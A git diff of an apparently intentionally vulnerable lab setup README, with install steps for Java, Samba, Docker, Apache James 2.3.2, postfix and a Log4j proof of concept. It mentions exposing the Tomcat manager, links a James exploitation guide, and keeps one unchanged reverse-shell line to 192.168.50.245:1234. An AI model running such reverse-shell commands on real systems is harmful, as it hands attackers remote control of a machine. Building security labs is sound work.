@@ -18,6 +18,7 @@
 * Make manager interface of apache-tomcat public
 
 ```
+#Install java 8
 #!/bin/bash
 sudo apt update 
 sudo apt install openjdk-8-jdk -y
@@ -27,22 +28,20 @@ sudo apt install samba -y
 sudo mkdir -p /samba
 sudo ufw allow samba
 echo "*******samba done**********"
+
 #install docker
 echo "***********Install docker***********"
 sudo apt update
-sudo apt install ca-certificates curl gnupg lsb-release
-sudo mkdir -p /etc/apt/keyrings
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
-echo \
-  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
-  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-  sudo apt update
-  sudo chmod a+r /etc/apt/keyrings/docker.gpg -y
+sudo apt install apt-transport-https ca-certificates curl gnupg2 software-properties-common
+curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
+sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable"
 sudo apt update
-sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin -y
+apt-cache policy docker-ce
+sudo apt install docker-ce -y
 sudo usermod -aG docker ${USER}
 echo "*********docker is done**********"
 
+#install james server
 echo "*********install james server********"
 sudo apt install bash-completion  
 curl -O https://archive.apache.org/dist/james/server/apache-james-2.3.2.tar.gz
@@ -63,7 +62,7 @@ echo "Installing postfix smtp server"
 sudo apt update
 sudo apt install postfix
 sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.bk
-echo "smtp done"
+echo "***smtp done***"
 
 #Log4j PoC
 echo "*********log4j poc************"
@@ -388,5 +387,6 @@ bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 * https://phoenixnap.com/kb/ubuntu-samba
 * https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html
 * https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server
+* https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-debian-9
 
 
